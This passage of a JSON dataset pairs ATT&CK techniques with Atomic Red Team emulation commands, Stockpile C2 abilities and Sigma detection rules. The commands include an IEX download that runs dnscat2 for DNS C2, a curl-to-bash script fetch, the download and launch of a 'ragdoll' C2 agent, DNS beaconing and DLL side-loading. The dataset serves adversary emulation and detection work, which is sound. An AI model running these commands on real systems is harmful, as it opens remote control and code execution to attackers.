Cleared", "id": "f2f01843-e7b8-4f95-a35a-d23584476423", "description": "Some threat groups tend to delete the local 'Security' Eventlog using certain utitlities", "tags": ["attack.defense_evasion", "attack.t1070", "car.2016-04-002"], "author": "Florian Roth", "logsource": {"product": "windows", "service": "security"}, "detection": {"selection": {"EventID": [517, 1102]}, "condition": "selection"}, "falsepositives": ["Rollout of log collection agents (the setup routine often includes a reset of the local Eventlog)", "System provisioning (system reset before the golden image creation)"], "level": "high"}}]}, {"technique_id": "T1071", "commands": [{"source": "atomics/T1071/T1071.yaml", "command": "Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com >nul 2>&1\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com >nul 2>&1\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com >nul 2>&1\ncurl -s -A \"*<|>*\" -m3 www.google.com >nul 2>&1\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com\ncurl -s -A \"*<|>*\" -m3 www.google.com\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io\" -QuickTimeout}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"TXT\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": null, "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain atomicredteam -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": null, "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": null, "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": null, "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType #{query_type}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain example.com -DNSServer #{server_ip}\n", "name": null}, {"source": "atomics/T1071/T1071.yaml", "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer 127.0.0.1\n", "name": null}, {"source": "data/abilities/command-and-control/0ab383be-b819-41bf-91b9-1bd4404d83bf.yml", "command": {"darwin": {"sh": {"command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n", "cleanup": "pkill -f ragdoll\n"}}, "linux": {"sh": {"command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n", "cleanup": "pkill -f ragdoll\n"}}}, "name": "A Python agent which communicates via the HTML contact"}], "parsed_datasets": [{"Atomic Red Team Test - Standard Application Layer Protocol": {"attack_technique": "T1071", "display_name": "Standard Application Layer Protocol", "atomic_tests": [{"name": "Malicious User Agents - Powershell", "description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Default domain to simulate against", "type": "string", "default": "www.google.com"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Invoke-WebRequest #{domain} -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest #{domain} -UserAgent \"*<|>*\" | out-null\n"}}, {"name": "Malicious User Agents - CMD", "description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Default domain to simulate against", "type": "string", "default": "www.google.com"}}, "executor": {"name": "command_prompt", "command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain} >nul 2>&1\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain} >nul 2>&1\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain} >nul 2>&1\ncurl -s -A \"*<|>*\" -m3 #{domain} >nul 2>&1\n"}}, {"name": "Malicious User Agents - Nix", "description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"domain": {"description": "Default domain to simulate against", "type": "string", "default": "www.google.com"}}, "executor": {"name": "sh", "command": "curl -s -A \"HttpBrowser/1.0\" -m3 #{domain}\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 #{domain}\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 #{domain}\ncurl -s -A \"*<|>*\" -m3 #{domain}\n"}}, {"name": "DNS Large Query Volume", "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Default domain to simulate against", "type": "string", "default": "127.0.0.1.xip.io"}, "subdomain": {"description": "Subdomain prepended to the domain name", "type": "string", "default": "atomicredteam"}, "query_type": {"description": "DNS query type", "type": "string", "default": "TXT"}, "query_volume": {"description": "Number of DNS queries to send", "type": "integer", "default": 1000}}, "executor": {"name": "powershell", "elevation_required": false, "command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n"}}, {"name": "DNS Regular Beaconing", "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Default domain to simulate against", "type": "string", "default": "127.0.0.1.xip.io"}, "subdomain": {"description": "Subdomain prepended to the domain name", "type": "string", "default": "atomicredteam"}, "query_type": {"description": "DNS query type", "type": "string", "default": "TXT"}, "c2_interval": {"description": "Seconds between C2 requests to the command and control server", "type": "integer", "default": 30}, "c2_jitter": {"description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests", "type": "integer", "default": 20}, "runtime": {"description": "Time in minutes to run the simulation", "type": "integer", "default": 30}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n"}}, {"name": "DNS Long Domain Query", "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Default domain to simulate against", "type": "string", "default": "127.0.0.1.xip.io"}, "subdomain": {"description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)", "type": "string", "default": "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte"}, "query_type": {"description": "DNS query type", "type": "string", "default": "TXT"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n"}}, {"name": "DNS C2", "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Domain Name configured to use DNS Server where your C2 listener is running", "type": "string", "default": "example.com"}, "server_ip": {"description": "IP address of DNS server where your C2 listener is running", "type": "string", "default": "127.0.0.1"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}\n"}}]}}, {"Mitre Stockpile - A Python agent which communicates via the HTML contact": {"id": "0ab383be-b819-41bf-91b9-1bd4404d83bf", "name": "Ragdoll", "description": "A Python agent which communicates via the HTML contact", "tactic": "command-and-control", "technique": {"attack_id": "T1071", "name": "Standard Application Layer Protocol"}, "platforms": {"darwin": {"sh": {"command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n", "cleanup": "pkill -f ragdoll\n"}}, "linux": {"sh": {"command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n", "cleanup": "pkill -f ragdoll\n"}}}}}], "command_list": ["Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null\n", "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com >nul 2>&1\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com >nul 2>&1\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com >nul 2>&1\ncurl -s -A \"*<|>*\" -m3 www.google.com >nul 2>&1\n", "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com\ncurl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com\ncurl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com\ncurl -s -A \"*<|>*\" -m3 www.google.com\n", "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io\" -QuickTimeout}\n", "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"TXT\" \"#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", null, "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain atomicredteam -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", null, null, null, "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain #{subdomain} -QueryType #{query_type}\n", "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType #{query_type}\n", "Set-Location PathToAtomicsFolder\n.\\T1071\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType TXT\n", "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain example.com -DNSServer #{server_ip}\n", "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer 127.0.0.1\n", {"darwin": {"sh": {"command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:darwin\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n", "cleanup": "pkill -f ragdoll\n"}}, "linux": {"sh": {"command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}\n", "cleanup": "pkill -f ragdoll\n"}}}], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "DNS TXT Answer with possible execution strings", "id": "8ae51330-899c-4641-8125-e39f2e07da72", "status": "experimental", "description": "Detects strings used in command execution in DNS TXT Answer", "references": ["https://twitter.com/stvemillertime/status/1024707932447854592", "https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1"], "tags": ["attack.t1071"], "author": "Markus Neis", "date": "2018/08/08", "logsource": {"category": "dns"}, "detection": {"selection": {"record_type": "TXT", "answer": ["*IEX*", "*Invoke-Expression*", "*cmd.exe*"]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1073", "commands": [{"source": "atomics/T1073/T1073.yaml", "command": "#{gup_executable}\n", "name": null}, {"source": "atomics/T1073/T1073.yaml", "command": "PathToAtomicsFolder\\T1073\\bin\\GUP.exe\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - DLL Side-Loading": {"attack_technique": "T1073", "display_name": "DLL Side-Loading", "atomic_tests": [{"name": "DLL Side-Loading using the Notepad++ GUP.exe binary", "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n", "supported_platforms": ["windows"], "input_arguments": {"process_name": {"description": "Name of the created process", "type": "string", "default": "calculator.exe"}, "gup_executable": {"description": "GUP is an open source signed binary used by Notepad++ for software updates", "type": "path", "default": "PathToAtomicsFolder\\T1073\\bin\\GUP.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Gup.exe binary must exist on disk at specified location (#{gup_executable})\n", "prereq_command": "if (Test-Path #{gup_executable}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1073/bin/GUP.exe\" -OutFile \"#{gup_executable}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "#{gup_executable}\n", "cleanup_command": "taskkill /F /IM #{process_name} >nul 2>&1\n"}}]}}], "command_list": ["#{gup_executable}\n", "PathToAtomicsFolder\\T1073\\bin\\GUP.exe\n"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"action": "global", "title": "DNS ServerLevelPluginDll Install", "id": "e61e8a88-59a9-451c-874e-70fcc9740d67", "status": "experimental", "description": "Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required)", "references": ["https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83"], "date": "2017/05/08", "author": "Florian Roth", "tags": ["attack.defense_evasion", "attack.t1073"], "detection": {"condition": "1 of them"}, "fields": ["EventID", "CommandLine", "ParentCommandLine", "Image", "User", "TargetObject"], "falsepositives": ["unknown"], "level": "high"}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"dnsregmod": {"EventID": 13, "TargetObject": "*\\services\\DNS\\Parameters\\ServerLevelPluginDll"}}}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"dnsadmin": {"CommandLine": "dnscmd.exe /config /serverlevelplugindll *"}}}}, {"data_source": {"title": "Possible Process Hollowing Image Loading", "id": "e32ce4f5-46c6-4c47-ba69-5de3c9193cd7", "status": "experimental", "description": "Detects Loading of samlib.dll, WinSCard.dll from untypical process e.g. through process hollowing by Mimikatz", "references": ["https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for.html"], "author": "Markus Neis", "date": "2018/01/07", "tags": ["attack.defense_evasion", "attack.t1073"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 7, "Image": ["*\\notepad.exe"], "ImageLoaded": ["*\\samlib.dll", "*\\WinSCard.dll"]}, "condition": "selection"}, "falsepositives": ["Very likely, needs more tuning"], "level": "high"}}, {"data_source": {"title": "Executable used by PlugX in Uncommon Location - Sysmon Version", "id": "aeab5ec5-be14-471a-80e8-e344418305c2", "status": "experimental", "description": "Detects the execution of an executable that is typically used by PlugX for DLL side loading started from an uncommon location", "references": ["http://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/", "https://countuponsecurity.com/2017/06/07/threat-hunting-in-the-enterprise-with-appcompatprocessor/"], "author": "Florian Roth", "date": "2017/06/12", "tags": ["attack.s0013", "attack.defense_evasion", "attack.t1073"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_cammute": {"Image": "*\\CamMute.exe"}, "filter_cammute": {"Image": "*\\Lenovo\\Communication Utility\\\\*"}, "selection_chrome_frame": {"Image": "*\\chrome_frame_helper.exe"}, "filter_chrome_frame": {"Image": "*\\Google\\Chrome\\application\\\\*"}, "selection_devemu": {"Image": "*\\dvcemumanager.exe"}, "filter_devemu": {"Image": "*\\Microsoft Device Emulator\\\\*"}, "selection_gadget": {"Image": "*\\Gadget.exe"}, "filter_gadget": {"Image": "*\\Windows Media Player\\\\*"}, "selection_hcc": {"Image": "*\\hcc.exe"}, "filter_hcc": {"Image": "*\\HTML Help Workshop\\\\*"}, "selection_hkcmd": {"Image": "*\\hkcmd.exe"}, "filter_hkcmd": {"Image": ["*\\System32\\\\*", "*\\SysNative\\\\*", "*\\SysWowo64\\\\*"]}, "selection_mc": {"Image": "*\\Mc.exe"}, "filter_mc": {"Image": ["*\\Microsoft Visual Studio*", "*\\Microsoft SDK*", "*\\Windows Kit*"]}, "selection_msmpeng": {"Image": "*\\MsMpEng.exe"}, "filter_msmpeng": {"Image": ["*\\Microsoft Security Client\\\\*", "*\\Windows Defender\\\\*", "*\\AntiMalware\\\\*"]}, "selection_msseces": {"Image": "*\\msseces.exe"}, "filter_msseces": {"Image": ["*\\Microsoft Security Center\\\\*", "*\\Microsoft Security Client\\\\*", "*\\Microsoft Security Essentials\\\\*"]}, "selection_oinfo": {"Image": "*\\OInfoP11.exe"}, "filter_oinfo": {"Image": "*\\Common Files\\Microsoft Shared\\\\*"}, "selection_oleview": {"Image": "*\\OleView.exe"}, "filter_oleview": {"Image": ["*\\Microsoft Visual Studio*", "*\\Microsoft SDK*", "*\\Windows Kit*", "*\\Windows Resource Kit\\\\*"]}, "selection_rc": {"Image": "*\\rc.exe"}, "filter_rc": {"Image": ["*\\Microsoft Visual Studio*", "*\\Microsoft SDK*", "*\\Windows Kit*", "*\\Windows Resource Kit\\\\*", "*\\Microsoft.NET\\\\*"]}, "condition": "( selection_cammute and not filter_cammute ) or ( selection_chrome_frame and not filter_chrome_frame ) or ( selection_devemu and not filter_devemu ) or ( selection_gadget and not filter_gadget ) or ( selection_hcc and not filter_hcc ) or ( selection_hkcmd and not filter_hkcmd ) or ( selection_mc and not filter_mc ) or ( selection_msmpeng and not filter_msmpeng ) or ( selection_msseces and not filter_msseces ) or ( selection_oinfo and not filter_oinfo ) or ( selection_oleview and not filter_oleview ) or ( selection_rc and not filter_rc )"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "DHCP Server Loaded the CallOut DLL", "id": "13fc89a9-971e-4ca6-b9dc-aa53a445bf40", "status": "experimental", "description": "This rule detects a DHCP server in which a specified Callout DLL (in registry) was loaded", "references": ["https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html", "https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx", "https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx"], "date": "2017/05/15", "author": "Dimitrios Slamaris", "tags": ["attack.defense_evasion", "attack.t1073"], "logsource": {"product": "windows", "service": "system"}, "detection": {"selection": {"EventID": 1033}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "DHCP Server Error Failed Loading the CallOut DLL", "id": "75edd3fd-7146-48e5-9848-3013d7f0282c", "description": "This rule detects a DHCP server error in which a specified Callout DLL (in registry) could not be loaded", "status": "experimental", "references": ["https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html", "https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx", "https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx"], "date": "2017/05/15", "modified": "2019/07/17", "tags": ["attack.defense_evasion", "attack.t1073"], "author": "Dimitrios Slamaris, @atc_project (fix)", "logsource": {"product": "windows", "service": "system"}, "detection": {"selection": {"EventID": [1031, 1032, 1034], "Source": "Microsoft-Windows-DHCP-Server"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "DNS Server Error Failed Loading the ServerLevelPluginDLL", "id": "cbe51394-cd93-4473-b555-edf0144952d9", "description": "This rule detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded", "status": "experimental", "date": "2017/05/08", "references": ["https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83", "https://technet.microsoft.com/en-us/library/cc735829(v=ws.10).aspx", "https://twitter.com/gentilkiwi/status/861641945944391680"], "tags": ["attack.defense_evasion", "attack.t1073"], "author": "Florian Roth", "logsource": {"product": "windows", "service": "dns-server"}, "detection": {"selection": {"EventID": [150, 770]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "Suspicious GUP Usage", "id": "0a4f6091-223b-41f6-8743-f322ec84930b", "description": "Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks", "status": "experimental", "references": ["https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html"], "tags": ["attack.defense_evasion", "attack.t1073"], "author": "Florian Roth", "date": "2019/02/06", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\GUP.exe"}, "filter": {"Image": ["C:\\Users\\\\*\\AppData\\Local\\Notepad++\\updater\\gup.exe", "C:\\Users\\\\*\\AppData\\Roaming\\Notepad++\\updater\\gup.exe", "C:\\Program Files\\Notepad++\\updater\\gup.exe", "C:\\Program Files (x86)\\Notepad++\\updater\\gup.exe"]}, "condition": "selection and not filter"}, "falsepositives": ["Execution of tools named GUP.exe and located in folders different than Notepad++\\updater"], "level": "high"}}]}, {"technique_id": "T1074", "commands": [{"source": "atomics/T1074/T1074.yaml", "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat\n", "name": null}, {"source": "atomics/T1074/T1074.yaml", "command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > /tmp/T1074_discovery.log\n", "name": null}, {"source": "atomics/T1074/T1074.yaml", "command": "Compress-Archive -Path PathToAtomicsFolder\\T1074\\bin\\Folder_to_zip -DestinationPath #{output_file} -Force\n", "name": null}, {"source": "atomics/T1074/T1074.yaml", "command": "Compress-Archive -Path #{input_file} -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force\n", "name": null}, {"source": "data/abilities/collection/4e97e699-93d7-4040-b5a3-2e906a58199e.yml", "command": {"darwin": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "linux": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "windows": {"psh": {"command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}, "cmd": {"command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]\n"}}}, "name": "copy files to staging directory"}, {"source": "data/abilities/collection/6469befa-748a-4b9c-a96d-f191fde47d89.yml", "command": {"darwin": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "windows": {"psh,pwsh": {"command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "cleanup": "Remove-Item -Path \"staged\" -recurse\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}, "name": "create a directory for exfil staging"}], "parsed_datasets": [{"Atomic Red Team Test - Data Staged": {"attack_technique": "T1074", "display_name": "Data Staged", "atomic_tests": [{"name": "Stage data from Discovery.bat", "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n", "supported_platforms": ["windows"], 